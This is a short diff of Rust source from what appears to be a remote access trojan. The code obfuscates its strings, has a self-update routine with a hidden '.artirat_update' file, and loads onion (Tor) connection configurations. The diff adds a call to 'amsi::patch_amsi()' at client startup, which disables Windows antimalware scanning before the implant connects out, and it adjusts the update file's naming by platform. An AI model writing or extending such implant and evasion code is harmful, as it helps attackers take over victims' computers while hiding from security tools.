@@ -581,6 +581,7 @@ Available commands:
                 .into_bytes());
             }
 
+            #[cfg(not(target_os = "windows"))]
             let tmp_name = astr!(".artirat_update");
             #[cfg(target_os = "windows")]
             let tmp_name = astr!(".artirat_update.exe");
@@ -902,6 +903,7 @@ async fn netclient_impl() {
         startup_delay,
         astr!("s")
     );
+    amsi::patch_amsi();
     sleep(Duration::from_secs(startup_delay)).await;
 
     let configs = get_onion_configs();
